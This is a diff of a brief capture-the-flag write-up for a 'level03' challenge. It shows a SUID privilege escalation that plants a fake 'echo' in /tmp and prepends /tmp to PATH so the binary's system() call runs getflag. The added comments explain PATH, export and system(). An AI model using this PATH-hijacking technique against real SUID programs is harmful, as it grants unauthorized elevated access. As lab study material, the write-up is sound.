@@ -1,14 +1,21 @@
 # method: privelege excalation 
 # vulnerability: SUID permission
 
+ll # level03 can execute other commands with high privelage
 ltrace ./level03
-echo getflag > /tmp/echo && chmod +x /tmp/echo
-export PATH=/tmp:$PATH 
+env # the list of environmental variables
+echo getflag > /tmp/echo && chmod +x /tmp/echo # aliasing getflag
+export PATH=/tmp:$PATH # start from the directory with alias
 ./level03
 
+# system = exec - executes a command
 # export -  make the local shell variable VAR global or called by PATH.
 # $PATH - environmental variable, a colon-delimited list of directories that tells the shell which directories to search for executable files.
 # PATH=/tmp - only tmp directory would be in PATH
 # PATH=/tmp:$PATH - tmp directory will be added to the existing list in PATH
 
 # level03 calls echo -> save variable called echo with text getflag -> add directory with it to the PATH
+
+
+# system("/usr/bin/env echo Exploit me"Exploit me
+# system will call echo command from address /usr/bin/env
